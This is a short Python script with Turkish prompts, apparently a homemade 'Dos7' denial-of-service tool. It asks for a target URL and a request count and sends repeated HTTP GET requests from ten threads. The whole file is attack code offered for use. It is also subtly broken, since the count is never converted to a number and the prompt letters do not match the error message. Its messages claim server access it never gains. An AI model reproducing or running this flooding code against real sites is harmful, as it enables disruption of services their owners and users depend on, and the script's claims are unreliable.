import requests
import time
import threading
def proceed():
    while True:
        decision = input("Onaylamak İstiyormusnuz (e/h): ").strip().lower()
        if decision == 'e':
            print("YevGroup Dos7 Sistemine Hoşgeldiniz Lütfen 10 Saniye Bekleyiniz")
            time.sleep(10)
            print("DDOS Sistemi Başlatılıyor Bekleyiniz...")
            time.sleep(2)
            print("Sunuculara Erişim Sağlandı")
            time.sleep(2)

            target_url = input("Hedef Belirtiniz:")
            print("Hedefe Erişim Sağlanıyor")
            time.sleep(2)
            print("Saldırı Başladı")

            
            num_requests = input("Saldırı Sayısı:")

        
            def send_request():
                for _ in range(num_requests):
                    try:
                        response = requests.get(target_url)
                        print(f"Response: {response.status_code}")
                    except Exception as e:
                        print(f"Error: {e}")

            
            threads = []
            for _ in range(10):  #
                thread = threading.Thread(target=send_request)
                threads.append(thread)
                thread.start()

            
            for thread in threads:
                thread.join()

            break
        elif decision == 'h':
            print("İşlem iptal edildi.")
            break
        else:
            print("Geçersiz giriş. Lütfen 'y' veya 'n' girin.")


proceed()

#Yev Group GPL3 Dos7 İstek Sistemi
